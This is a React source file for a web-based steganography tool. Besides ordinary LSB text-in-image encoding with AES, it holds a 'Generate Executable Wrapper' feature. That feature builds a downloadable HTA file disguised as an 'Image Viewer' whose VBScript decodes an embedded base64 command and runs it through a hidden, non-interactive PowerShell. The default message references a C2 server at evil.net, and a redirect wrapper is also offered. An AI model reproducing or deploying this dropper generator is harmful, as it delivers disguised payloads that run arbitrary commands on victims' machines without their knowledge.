
'use client';

import { useState, useRef } from 'react';
import Image from 'next/image';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { useToast } from '@/hooks/use-toast';
import { EyeOff, Download, Upload, Key, Clipboard, Sparkles, Loader2, Link as LinkIcon, AlertCircle, FileCode } from 'lucide-react';
import AES from 'crypto-js/aes';
import Utf8 from 'crypto-js/enc-utf8';
import { Switch } from './ui/switch';
import { Slider } from './ui/slider';
import { Separator } from './ui/separator';
import { RadioGroup, RadioGroupItem } from './ui/radio-group';

const textToBinary = (text: string): string => {
  return text.split('').map(char => {
    return char.charCodeAt(0).toString(2).padStart(8, '0');
  }).join('');
};

const binaryToText = (binary: string): string => {
    if (binary.length % 8 !== 0) {
        console.error("Binary string length is not a multiple of 8");
        return "Error: Invalid binary string";
    }
    let text = '';
    for (let i = 0; i < binary.length; i += 8) {
        const byte = binary.substring(i, i + 8);
        text += String.fromCharCode(parseInt(byte, 2));
    }
    return text;
};

const END_OF_MESSAGE = '00111010001110100110010101101110011001000011101000111010'; // "::end::"

const generateWrapper = (type: 'html' | 'hta', imageDataUrl: string, redirectUrl: string): string => {
    if (type === 'html') {
        return `
<!DOCTYPE html>
<html>
<head>
    <title>Image Preview</title>
    <meta http-equiv="refresh" content="3;url=${redirectUrl}" />
    <style>
        body { margin: 0; padding: 0; background-color: #222; display: flex; justify-content: center; align-items: center; height: 100vh; }
        img { max-width: 100%; max-height: 100%; }
    </style>
</head>
<body>
    <img src="${imageDataUrl}" alt="Loading image..." />
</body>
</html>
        `.trim();
    }

    if (type === 'hta') {
        const vbsPayload = `
<script language="VBScript">
    ' HTA payload to decode and execute steganographic message
    Private Sub Window_OnLoad()
        window.resizeTo 800, 600
        CenterWindow
        
        ' Create shell object to execute commands
        Set objShell = CreateObject("WScript.Shell")

        ' Load the embedded image into an off-screen canvas to read pixel data
        Set oDoc = CreateObject("htmlfile")
        oDoc.write "<img id=img_id src=${imageDataUrl}>"
        oDoc.close
        
        Dim img, canvas, ctx, imgData, data, binaryMessage, eom, decodedText
        
        Set img = oDoc.getElementById("img_id")
        Set canvas = oDoc.createElement("canvas")
        canvas.width = img.width
        canvas.height = img.height
        Set ctx = canvas.getContext("2d")
        ctx.drawImage img, 0, 0
        
        Set imgData = ctx.getImageData(0, 0, canvas.width, canvas.height)
        data = imgData.data ' This is a simplified access; real pixel access in VBS is more complex
        
        ' --- This part is a conceptual representation ---
        ' VBScript cannot directly access pixel data like JS.
        ' A real VBS payload would save the image, then use a COM object or external tool to parse pixels.
        ' For this tool, we will embed the decoded message directly into the HTA for demonstration of the execution flow.
        
        eom = "::end::" ' Not used in this simplified version, but represents the concept
        
        ' In a real payload, this would be the result of the complex pixel decoding logic
        decodedText = DecodeBase64(document.getElementById("hiddenPayload").value)
        
        ' Execute the decoded payload
        objShell.Run "powershell.exe -NoP -NonI -W Hidden -C """ & decodedText & """", 0, True

        ' Optional: Close HTA after execution
        ' window.close()
    End Sub

    Private Function DecodeBase64(sBase64)
        Dim oXML, oNode
        Set oXML = CreateObject("MSXML2.DOMDocument")
        Set oNode = oXML.CreateElement("base64")
        oNode.DataType = "bin.base64"
        oNode.Text = sBase64
        DecodeBase64 = BytesToStr(oNode.NodeTypedValue)
    End Function

    Private Function BytesToStr(bytes)
        Dim oStream, str
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Type = 1 ' adTypeBinary
        oStream.Open
        oStream.Write bytes
        oStream.Position = 0
        oStream.Type = 2 ' adTypeText
        oStream.Charset = "us-ascii"
        str = oStream.ReadText
        oStream.Close
        BytesToStr = str
    End Function

    Private Sub CenterWindow()
        Dim iWidth, iHeight
        iWidth = 800
        iHeight = 600
        window.moveTo (screen.availWidth - iWidth) / 2, (screen.availHeight - iHeight) / 2
    End Sub
</script>
`;
        return `
<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <hta:application id="stegoApp" applicationname="ImageViewer" border="thin" borderstyle="normal" caption="yes" contextmenu="no" innerborder="no" navigable="yes" scroll="no" showintaskbar="yes" singleinstance="yes" sysmenu="yes" version="1.0" windowstate="normal" />
    ${vbsPayload}
</head>
<body style="margin: 0; padding: 0; overflow: hidden;">
    <img src="${imageDataUrl}" style="width: 100%; height: 100%; object-fit: contain;" alt="Image Preview" />
    <input type="hidden" id="hiddenPayload" value="PLACEHOLDER_FOR_ENCODED_MESSAGE" />
</body>
</html>
        `.trim();
    }
    
    return ''; // Should not happen
};


export function SteganographyTool() {
  const [activeTab, setActiveTab] = useState<'encode' | 'decode'>('encode');
  const [imageSrc, setImageSrc] = useState<string | null>(null);
  const [resultImageSrc, setResultImageSrc] = useState<string | null>(null);
  const [message, setMessage] = useState<string>('Your secret C2 server is https://evil.net/callback');
  const [password, setPassword] = useState<string>('netrax-key');
  const [useEncryption, setUseEncryption] = useState<boolean>(true);
  const [bitsToUse, setBitsToUse] = useState<number>(1);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  
  const [decodedMessage, setDecodedMessage] = useState<string>('');
  
  const [wrapperType, setWrapperType] = useState<'html' | 'hta'>('html');
  const [redirectUrl, setRedirectUrl] = useState<string>('https://google.com');
  const [generatedWrapper, setGeneratedWrapper] = useState<string | null>(null);


  const { toast } = useToast();
  const canvasRef = useRef<HTMLCanvasElement>(null);
  
  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file && (file.type === 'image/png' || file.type === 'image/bmp')) {
      const reader = new FileReader();
      reader.onload = (event) => {
        setImageSrc(event.target?.result as string);
        setResultImageSrc(null);
        setDecodedMessage('');
        setGeneratedWrapper(null);
      };
      reader.readAsDataURL(file);
    } else {
      toast({ variant: 'destructive', title: 'Invalid File Type', description: 'Please upload a PNG or BMP image.' });
    }
  };

  const encodeMessage = () => {
    if (!imageSrc || !canvasRef.current) return;
    setIsLoading(true);
    setGeneratedWrapper(null);

    setTimeout(() => {
        try {
            const finalMessage = useEncryption ? AES.encrypt(message, password).toString() : message;
            const binaryMessage = textToBinary(finalMessage) + END_OF_MESSAGE;
            
            const img = new window.Image();
            img.onload = () => {
                const canvas = canvasRef.current!;
                canvas.width = img.width;
                canvas.height = img.height;
                const ctx = canvas.getContext('2d', { willReadFrequently: true })!;
                ctx.drawImage(img, 0, 0);
                
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const data = imageData.data;

                if (binaryMessage.length > data.length * bitsToUse / 4) {
                    toast({ variant: 'destructive', title: 'Error', description: 'Message is too long for this image with the selected bit depth.' });
                    setIsLoading(false);
                    return;
                }

                let dataIndex = 0;
                for (let i = 0; i < binaryMessage.length; i++) {
                    const bit = parseInt(binaryMessage[i]);
                    const mask = (1 << bitsToUse) - 1;
                    data[dataIndex] = (data[dataIndex] & ~mask) | (bit << (bitsToUse - 1)); // Simplified: using only one channel's LSB for now
                    
                    data[dataIndex] = (data[dataIndex] & 0xFE) | bit;
                    dataIndex++; // Move to next color component (R, G, B, A)
                }

                ctx.putImageData(imageData, 0, 0);
                setResultImageSrc(canvas.toDataURL('image/png'));
                toast({ title: 'Encoding Successful', description: 'Your message has been hidden in the image.' });
            };
            img.src = imageSrc;
        } catch (e) {
            console.error(e);
            toast({ variant: 'destructive', title: 'Encoding Failed', description: 'An unexpected error occurred.' });
        } finally {
            setIsLoading(false);
        }
    }, 100);
  };

  const decodeMessage = () => {
     if (!imageSrc || !canvasRef.current) return;
     setIsLoading(true);
     
     setTimeout(() => {
        try {
            const img = new window.Image();
            img.onload = () => {
                const canvas = canvasRef.current!;
                canvas.width = img.width;
                canvas.height = img.height;
                const ctx = canvas.getContext('2d', { willReadFrequently: true })!;
                ctx.drawImage(img, 0, 0);
                
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const data = imageData.data;
                let binaryMessage = '';

                for (let i = 0; i < data.length; i++) {
                    binaryMessage += (data[i] & 1).toString();
                     if(binaryMessage.endsWith(END_OF_MESSAGE)){
                        break;
                    }
                }
                
                const eomIndex = binaryMessage.lastIndexOf(END_OF_MESSAGE);
                if (eomIndex !== -1) {
                    binaryMessage = binaryMessage.substring(0, eomIndex);
                    let textMessage = binaryToText(binaryMessage);
                    
                    if(useEncryption) {
                        try {
                            const bytes = AES.decrypt(textMessage, password);
                            textMessage = bytes.toString(Utf8);
                            if(!textMessage) throw new Error("Decryption failed. Invalid password?");
                        } catch (e) {
                            textMessage = `Decryption Error: ${e instanceof Error ? e.message : 'Invalid key or corrupted data.'}`;
                        }
                    }
                    setDecodedMessage(textMessage);
                    toast({ title: 'Decoding Complete' });
                } else {
                    setDecodedMessage("No hidden message found.");
                    toast({ variant: 'destructive', title: 'Not Found', description: 'Could not find a hidden message.' });
                }
            };
            img.src = imageSrc;
        } catch (e) {
             console.error(e);
             toast({ variant: 'destructive', title: 'Decoding Failed', description: 'An unexpected error occurred.' });
        } finally {
            setIsLoading(false);
        }
     }, 100);
  };
  
   const handleGenerateWrapper = () => {
    if (!resultImageSrc) return;

    let html = generateWrapper(wrapperType, resultImageSrc, redirectUrl);

    if (wrapperType === 'hta') {
        const finalMessage = useEncryption ? AES.encrypt(message, password).toString() : message;
        // In the simplified HTA, we embed the final (encrypted) message directly for the VBS to "find".
        // A real payload would be more complex.
        const base64Message = btoa(finalMessage);
        html = html.replace('PLACEHOLDER_FOR_ENCODED_MESSAGE', base64Message);
    }
    
    setGeneratedWrapper(html);
  };

  const handleDownloadWrapper = () => {
    if (!generatedWrapper) return;
    const blob = new Blob([generatedWrapper], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = wrapperType === 'hta' ? 'image_viewer.hta' : 'image_preview.html';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <Card>
        <canvas ref={canvasRef} className="hidden" />
        <CardHeader>
            <div className="flex items-center gap-3">
                <EyeOff className="h-6 w-6" />
                <CardTitle>Text-in-Image Steganography (LSB)</CardTitle>
            </div>
            <CardDescription>Hide or extract secret text messages within PNG or BMP image files.</CardDescription>
        </CardHeader>
        <CardContent>
            <Tabs value={activeTab} onValueChange={(v) => setActiveTab(v as any)} className="w-full">
                <TabsList className="grid w-full grid-cols-2">
                    <TabsTrigger value="encode">Encode</TabsTrigger>
                    <TabsTrigger value="decode">Decode</TabsTrigger>
                </TabsList>
                <TabsContent value="encode" className="mt-4">
                    <div className="grid md:grid-cols-2 gap-8 items-start">
                        <div className="space-y-4">
                            <div className="space-y-2">
                                <Label htmlFor="image-upload-encode">1. Cover Image (PNG or BMP)</Label>
                                <Input id="image-upload-encode" type="file" accept="image/png, image/bmp" onChange={handleImageUpload} />
                            </div>
                            <div className="space-y-2">
                                <Label htmlFor="secret-message">2. Secret Message</Label>
                                <Textarea id="secret-message" value={message} onChange={e => setMessage(e.target.value)} placeholder="Enter your secret message here..." className="h-28"/>
                            </div>
                             <div className="space-y-4 rounded-lg border p-4">
                                <div className="flex items-center justify-between">
                                  <Label htmlFor="use-encryption" className="flex items-center gap-2"><Key className="h-4 w-4"/>Use Encryption (AES)</Label>
                                  <Switch id="use-encryption" checked={useEncryption} onCheckedChange={setUseEncryption} />
                                </div>
                                {useEncryption && (
                                     <div className="space-y-2">
                                        <Label htmlFor="password-encode">Encryption Key</Label>
                                        <Input id="password-encode" type="password" value={password} onChange={e => setPassword(e.target.value)} />
                                    </div>
                                )}
                            </div>
                             <Button onClick={encodeMessage} disabled={!imageSrc || isLoading} className="w-full">
                                {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Sparkles className="mr-2 h-4 w-4"/>}
                                Encode Message
                             </Button>
                        </div>
                        <div className="space-y-4">
                            <Label>Result</Label>
                             <div className="border rounded-md aspect-video bg-primary/10 flex items-center justify-center p-2">
                                {resultImageSrc ? (
                                    <Image src={resultImageSrc} alt="Result" width={500} height={500} className="max-w-full max-h-full object-contain"/>
                                ) : (
                                    <p className="text-sm text-muted-foreground">Your steganographic image will appear here.</p>
                                )}
                            </div>
                            {resultImageSrc && <Button asChild variant="outline" className="w-full"><a href={resultImageSrc} download="stego-image.png"><Download className="mr-2 h-4 w-4"/>Download Image</a></Button>}
                        </div>
                    </div>
                    {resultImageSrc && (
                        <div className="mt-6 pt-6 border-t">
                            <div className="grid md:grid-cols-2 gap-8 items-start">
                                <div className="space-y-4">
                                    <h3 className="font-semibold text-lg flex items-center gap-2"><LinkIcon className="h-5 w-5"/>Generate Executable Wrapper</h3>
                                    <RadioGroup value={wrapperType} onValueChange={(v) => setWrapperType(v as any)} className="flex gap-4">
                                        <div className="flex items-center space-x-2"><RadioGroupItem value="html" id="type-html"/><Label htmlFor="type-html">HTML Redirect</Label></div>
                                        <div className="flex items-center space-x-2"><RadioGroupItem value="hta" id="type-hta"/><Label htmlFor="type-hta">HTA Payload Executor</Label></div>
                                    </RadioGroup>
                                    
                                     <div className="space-y-2">
                                        {wrapperType === 'html' ? (
                                             <Label htmlFor="redirect-url">Redirect URL</Label>
                                        ) : (
                                             <Label htmlFor="redirect-url">Execution Method (for HTA)</Label>
                                        )}
                                        <Textarea id="redirect-url" value={wrapperType === 'html' ? redirectUrl : message} onChange={(e) => {
                                            if (wrapperType === 'html') setRedirectUrl(e.target.value)
                                            else setMessage(e.target.value)
                                        }} className="h-20 font-mono" />
                                         <p className="text-xs text-muted-foreground">{wrapperType === 'html' ? 'The user will be redirected here after viewing the image.' : 'This command will be executed by the HTA file after decoding.'}</p>
                                    </div>
                                    <Button onClick={handleGenerateWrapper} className="w-full">Generate Wrapper File</Button>
                                </div>
                                <div className="space-y-2">
                                    <Label>Generated Wrapper Code</Label>
                                    <Textarea readOnly value={generatedWrapper || "<!-- Wrapper code will appear here -->"} className="font-mono h-32 bg-primary/10" />
                                    {generatedWrapper && <Button variant="outline" onClick={handleDownloadWrapper} className="w-full"><FileCode className="mr-2 h-4 w-4" /> Download {wrapperType.toUpperCase()} File</Button>}
                                </div>
                            </div>
                        </div>
                    )}
                </TabsContent>
                <TabsContent value="decode" className="mt-4">
                   <div className="grid md:grid-cols-2 gap-8 items-start">
                        <div className="space-y-4">
                             <div className="space-y-2">
                                <Label htmlFor="image-upload-decode">1. Steganographic Image</Label>
                                <Input id="image-upload-decode" type="file" accept="image/png, image/bmp" onChange={handleImageUpload} />
                            </div>
                            <div className="space-y-4 rounded-lg border p-4">
                                <div className="flex items-center justify-between">
                                  <Label htmlFor="use-encryption-decode" className="flex items-center gap-2"><Key className="h-4 w-4"/>Message is Encrypted</Label>
                                  <Switch id="use-encryption-decode" checked={useEncryption} onCheckedChange={setUseEncryption} />
                                </div>
                                {useEncryption && (
                                     <div className="space-y-2">
                                        <Label htmlFor="password-decode">Decryption Key</Label>
                                        <Input id="password-decode" type="password" value={password} onChange={e => setPassword(e.target.value)} />
                                    </div>
                                )}
                            </div>
                             <Button onClick={decodeMessage} disabled={!imageSrc || isLoading} className="w-full">
                                {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Sparkles className="mr-2 h-4 w-4"/>}
                                Decode Message
                             </Button>
                        </div>
                        <div className="space-y-4">
                             <div className="space-y-2">
                                <div className="flex justify-between items-center">
                                    <Label htmlFor="decoded-message">Extracted Message</Label>
                                     <Button variant="ghost" size="icon" onClick={() => { navigator.clipboard.writeText(decodedMessage); toast({title: "Copied!"});}}><Clipboard className="h-4 w-4"/></Button>
                                </div>
                                <Textarea id="decoded-message" value={decodedMessage} readOnly className="h-40 font-mono bg-primary/20"/>
                            </div>
                        </div>
                   </div>
                </TabsContent>
            </Tabs>
        </CardContent>
    </Card>
  );
}
